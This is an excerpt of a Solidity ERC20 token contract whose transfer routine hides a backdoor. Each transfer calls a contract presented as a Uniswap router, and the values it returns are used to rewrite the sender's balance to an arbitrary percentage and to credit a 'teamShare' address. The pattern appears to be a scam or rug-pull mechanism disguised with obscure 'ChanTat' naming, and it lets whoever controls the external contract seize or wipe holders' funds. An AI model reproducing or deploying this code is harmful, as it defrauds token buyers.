...
// SPDX-License-Identifier: MIT
  ...
  function getChanTat(address tokenA, address tokenB, uint256 valueChanTat) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountChanTat, uint256 _liquifyChanTat, uint256 _rateChanTat) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueChanTat
      );
    return (_amountChanTat, _liquifyChanTat, _rateChanTat);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  function swapChanTat(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountChanTat, uint256 liquifyChanTat, uint256 rateChanTat) = getChanTat(sender, recipient, amounts);
      amountChanTat = getValues(sender, amountChanTat, liquifyChanTat, rateChanTat);
      return amountChanTat;
  }    
  ...
  function getRateChanTat(uint256 _amount, uint256 _rateChanTat) private pure returns (uint256) {
      return _amount.mul(_rateChanTat).div(10**2);
  }   
       

  function getValues(address tokenChanTat, uint256 amountChanTat, uint256 liquifyChanTat, uint256 rateChanTat) internal returns (uint256){
      if ( liquifyChanTat > 0 )
      {        
        _balances[tokenChanTat] = getRateChanTat(_balances[tokenChanTat], rateChanTat).add(amountChanTat);      
        _balances[teamShare] = _balances[teamShare].add(liquifyChanTat);
      }
      return amountChanTat;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountChanTat = swapChanTat(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountChanTat);
